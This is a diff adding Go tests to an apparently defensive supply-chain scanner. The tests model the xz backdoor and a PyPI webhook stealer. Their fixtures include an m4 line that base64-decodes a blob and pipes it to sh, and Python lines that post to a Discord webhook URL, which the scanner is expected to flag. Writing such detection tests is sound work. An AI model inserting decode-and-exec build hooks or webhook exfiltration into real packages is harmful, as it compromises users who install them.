@@ -195,6 +195,161 @@ func TestCollector_Collect_HappyPathEmitsDivergenceSignal(t *testing.T) {
 			"with category=build_glue — the load-bearing CVE-2024-3094 fact")
 }
 
+// TestCollector_Collect_BuildScriptConcernEmittedForMaliciousM4 is the
+// CVE-2024-3094 / xz case: a hand-written m4 macro that decodes a blob
+// and shell-execs it, shipped in the published tarball but absent from
+// the git tree. The collector must emit a build_script_concern signal
+// carrying a strong finding tagged path_in_repo=false (the xz shape).
+func TestCollector_Collect_BuildScriptConcernEmittedForMaliciousM4(t *testing.T) {
+	t.Parallel()
+
+	const (
+		entityID = "e-xzlike"
+		version  = "1.0.0"
+		tag      = "v1.0.0"
+		commit   = "abcabcabcabcabcabcabcabcabcabcabcabcabca"
+	)
+
+	tarball := buildTarGz(t, []tarEntry{
+		{path: "proj-1.0/configure.ac", body: []byte("AC_INIT([proj],[1.0])\nAC_PROG_CC\n")},
+		{path: "proj-1.0/src/lib.c", body: []byte("/* real source */\n")},
+		{path: "proj-1.0/m4/build-to-host.m4", body: []byte("dnl helper\nm4_esyscmd([echo cGF5bG9hZA== | base64 -d | sh])\n")},
+	})
+	// Repo tree has the benign files but NOT the malicious m4 macro.
+	gitPaths := []string{"configure.ac", "src/lib.c"}
+
+	inRun := &signal.CollectionResult{}
+	inRun.RecordSignal(entityID, "artifact_url", "pypi-registry",
+		mustParseTime(t, "2026-06-03T00:00:00Z"), 24*time.Hour,
+		map[string]any{
+			"url":      "https://example.invalid/proj-1.0.0.tar.gz",
+			"version":  version,
+			"git_head": "",
+		})
+
+	collector := NewCollector(CollectorConfig{
+		InRun:     inRun,
+		ClonePath: "/fake/clone",
+		Fetcher:   &stubFetcher{body: tarball},
+		Git: &stubGit{
+			tags:        []string{tag},
+			pathsByRef:  map[string][]string{tag: gitPaths},
+			commitByRef: map[string]string{tag: commit},
+		},
+	})
+
+	entity := &profile.Entity{
+		ID:           entityID,
+		CanonicalURI: "pkg:pypi/proj",
+		Type:         profile.EntityPackage,
+		Ecosystem:    "pypi",
+	}
+
+	result, err := collector.Collect(context.Background(), entity)
+	require.NoError(t, err)
+
+	var sig profile.Signal
+	for _, s := range result.Signals() {
+		if s.Type == "build_script_concern" {
+			sig = s
+			break
+		}
+	}
+	require.NotEmpty(t, sig.Type, "a malicious m4 macro must emit build_script_concern")
+
+	var concern BuildScriptConcern
+	require.NoError(t, json.Unmarshal(sig.Value, &concern))
+
+	var strongArtifactOnly bool
+	for _, f := range concern.Findings {
+		require.Equal(t, "m4/build-to-host.m4", f.Path, "path reported post-strip")
+		if f.Severity == "strong" && !f.PathInRepo {
+			strongArtifactOnly = true
+		}
+	}
+	require.True(t, strongArtifactOnly,
+		"decode+exec in an artifact-only m4 macro must be a strong, path_in_repo=false finding")
+}
+
+// TestCollector_Collect_ExfilHostInArtifactComposesIntoDivergence is
+// the spadata case (June 2026 PyPI cookie stealer): the published sdist
+// hardcodes a Discord webhook in its source. The collector must scan
+// the artifact in the same pass that builds the divergence manifest and
+// surface every hit on artifact_repo_divergence, tagged by whether the
+// path is also in the git tree — an artifact-only path being the
+// CVE-2024-3094 / xz shape.
+func TestCollector_Collect_ExfilHostInArtifactComposesIntoDivergence(t *testing.T) {
+	t.Parallel()
+
+	const (
+		entityID = "e-spadata"
+		version  = "0.1.1"
+		tag      = "v0.1.1"
+		commit   = "00ff00ff00ff00ff00ff00ff00ff00ff00ff00ff"
+	)
+
+	webhook := "https://discord.com/api/webhooks/1501511921185325186/AbC-def"
+	tarball := buildTarGz(t, []tarEntry{
+		{path: "spadata-0.1.1/setup.py", body: []byte("from setuptools import setup\nsetup(name='spadata')\n")},
+		{path: "spadata-0.1.1/spadata/__init__.py", body: []byte("import requests\nrequests.post('" + webhook + "')\n")},
+		{path: "spadata-0.1.1/spadata/stealer.py", body: []byte("x=1\ny=2\nrequests.post('" + webhook + "')\n")},
+	})
+	// Repo tree has setup.py and __init__.py but NOT stealer.py — the
+	// stealer module is present only in what was published.
+	gitPaths := []string{"setup.py", "spadata/__init__.py"}
+
+	inRun := &signal.CollectionResult{}
+	inRun.RecordSignal(entityID, "artifact_url", "pypi-registry",
+		mustParseTime(t, "2026-06-03T00:00:00Z"), 24*time.Hour,
+		map[string]any{
+			"url":       "https://example.invalid/spadata-0.1.1.tar.gz",
+			"version":   version,
+			"git_head":  "", // force tag-match path
+			"integrity": "sha256-ZZZZ",
+		})
+
+	collector := NewCollector(CollectorConfig{
+		InRun:     inRun,
+		ClonePath: "/fake/clone",
+		Fetcher:   &stubFetcher{body: tarball},
+		Git: &stubGit{
+			tags:        []string{tag},
+			pathsByRef:  map[string][]string{tag: gitPaths},
+			commitByRef: map[string]string{tag: commit},
+		},
+	})
+
+	entity := &profile.Entity{
+		ID:           entityID,
+		CanonicalURI: "pkg:pypi/spadata",
+		Type:         profile.EntityPackage,
+		Ecosystem:    "pypi",
+	}
+
+	result, err := collector.Collect(context.Background(), entity)
+	require.NoError(t, err)
+	require.Equal(t, 1, result.SignalCount())
+
+	var sig profile.Signal
+	for _, s := range result.Signals() {
+		if s.Type == "artifact_repo_divergence" {
+			sig = s
+			break
+		}
+	}
+	require.NotEmpty(t, sig.Type)
+
+	var cmp Comparison
+	require.NoError(t, json.Unmarshal(sig.Value, &cmp))
+
+	require.Equal(t, []ArtifactExfilHit{
+		{Path: "spadata/__init__.py", Line: 2, Host: "discord.com/api/webhooks", PathInRepo: true},
+		{Path: "spadata/stealer.py", Line: 3, Host: "discord.com/api/webhooks", PathInRepo: false},
+	}, cmp.ExfilHostsInArtifact,
+		"both hardcoded Discord webhooks must surface post-strip, tagged by "+
+			"repo presence; stealer.py is artifact-only (the xz shape)")
+}
+
 // TestCollector_Collect_Cargo_VCSInfoRescuesPair is the canonical
 // cargo case: registry metadata exposes no gitHead (crates.io
 // doesn't carry one), and the version string is "0.0.0-dev" with
